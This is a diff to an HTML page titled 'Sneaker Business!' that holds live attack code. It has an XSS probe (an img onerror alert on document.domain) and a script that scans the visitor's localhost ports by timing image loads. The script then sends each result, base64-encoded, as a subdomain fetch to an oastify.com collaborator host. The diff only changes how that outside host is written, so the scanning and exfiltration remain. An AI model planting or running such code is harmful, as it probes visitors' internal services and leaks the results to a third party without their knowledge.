@@ -9,7 +9,6 @@
     <h1>Sneaker Business!</h1>
     <IMPORTANT> <img src="x" onerror=alert(document.domain)> </IMPORTANT>
     <script>
-        var COLLAB = 'w304c6kvputj973pwmh2pb8aw12sqje8.oastify.com';
         var PORTS = [22, 80, 443, 3306, 8080];
         
         PORTS.forEach(function(port) {
@@ -17,7 +16,7 @@
             var t = Date.now();
             img.onload = img.onerror = function() {
                 var ms = Date.now() - t;
-                fetch('https://' + btoa('p' + port + '-' + ms) + '.' + COLLAB);
+                fetch('https://' + btoa('p' + port + '-' + ms) + '.' + '378bgdo2t1xqde7w0tl9tich086zusih.oastify.com');
             };
             img.src = 'http://127.0.0.1:' + port + '/x?' + t;
         });
